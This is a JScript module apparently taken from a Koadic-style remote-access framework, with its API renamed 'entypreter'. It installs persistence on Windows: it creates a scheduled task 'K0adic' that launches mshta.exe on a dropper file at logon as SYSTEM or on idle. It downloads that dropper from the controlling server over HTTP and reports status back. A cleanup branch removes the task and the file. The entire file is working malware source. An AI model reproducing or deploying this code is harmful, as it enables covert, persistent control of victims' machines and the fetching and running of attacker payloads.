try
{
    var headers = {};
    var taskname = "K0adic";
    var droppath = entypreter.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    if (~CLEANUP~)
    {
        var result = entypreter.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        headers["Task"] = "DeleteTask";
        entypreter.work.report(result, headers);
        headers["Task"] = "DeleteDropper";
        entypreter.file.deleteFile(droppath);
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        var result = entypreter.shell.exec("schtasks /query /tn "+taskname, "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        headers["Task"] = "QueryTask";
        entypreter.work.report(result, headers);
        if (~NOFORCE~)
        {
            if (result.indexOf("ERROR") == -1)
            {
                result = entypreter.shell.exec("schtasks /delete /tn "+taskname+" /f", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
                headers["Task"] = "NoForceTask";
                entypreter.work.report("", headers);
            }
        }
        if (~ELEVATED~)
        {
            result = entypreter.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onlogon /ru System /f", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        }
        else
        {
            result = entypreter.shell.exec("schtasks /create /tn "+taskname+" /tr \"C:\\Windows\\system32\\mshta.exe "+droppath+"\" /sc onidle /i 1 /f", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
        }
        headers["Task"] = "AddTask";
        entypreter.work.report(result, headers);

        headers["X-UploadFileJob"] = "true";
        entypreter.http.downloadEx("POST", entypreter.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        entypreter.work.report(entypreter.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    entypreter.work.report("Complete");
}
catch (e)
{
    entypreter.work.error(e);
}
entypreter.exit();
